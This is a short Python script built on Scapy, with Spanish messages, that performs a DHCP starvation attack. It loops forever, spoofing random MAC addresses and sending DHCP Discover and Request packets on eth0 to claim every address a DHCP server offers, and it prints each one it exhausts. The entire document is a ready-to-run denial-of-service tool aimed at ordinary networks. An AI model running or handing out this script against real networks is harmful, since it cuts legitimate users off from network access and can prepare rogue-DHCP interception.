from scapy.all import *
import random

conf.checkIPaddr = False
iface = "eth0"

print("Iniciando DHCP Starvation REAL...")

def random_mac():
    return RandMAC()

while True:

    mac = random_mac()

    # DISCOVER
    discover = (
        Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
        IP(src="0.0.0.0", dst="255.255.255.255") /
        UDP(sport=68, dport=67) /
        BOOTP(chaddr=mac.replace(":", "")) /
        DHCP(options=[("message-type", "discover"), "end"])
    )

    offer = srp1(discover, iface=iface, timeout=2, verbose=False)

    if offer:

        requested_ip = offer[BOOTP].yiaddr
        server_id = offer[DHCP].options[1][1]

        # REQUEST
        request = (
            Ether(src=mac, dst="ff:ff:ff:ff:ff:ff") /
            IP(src="0.0.0.0", dst="255.255.255.255") /
            UDP(sport=68, dport=67) /
            BOOTP(chaddr=mac.replace(":", "")) /
            DHCP(options=[
                ("message-type", "request"),
                ("requested_addr", requested_ip),
                ("server_id", server_id),
                "end"
            ])
        )

        sendp(request, iface=iface, verbose=False)

        print("IP agotada:", requested_ip)
